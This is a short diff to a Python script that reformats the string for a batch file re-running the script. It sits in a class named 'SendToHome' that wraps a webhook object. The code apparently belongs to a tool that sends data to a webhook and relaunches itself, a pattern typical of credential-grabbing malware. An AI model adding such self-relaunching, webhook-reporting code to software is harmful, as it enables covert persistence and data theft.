@@ -61,8 +61,8 @@ class Webhook:
 class SendToHome:
     def __init__(self, wh: Webhook) -> None:
         self.wh: Webhook = wh
-        self.bat_content: str = f'@echo off\npython {
-            os.path.abspath(__file__)}'
+        self.bat_content: str = f'''@echo off
+        python {os.path.abspath(__file__)}'''
         self.bat()
 
     def run(self, inp: str) -> None:
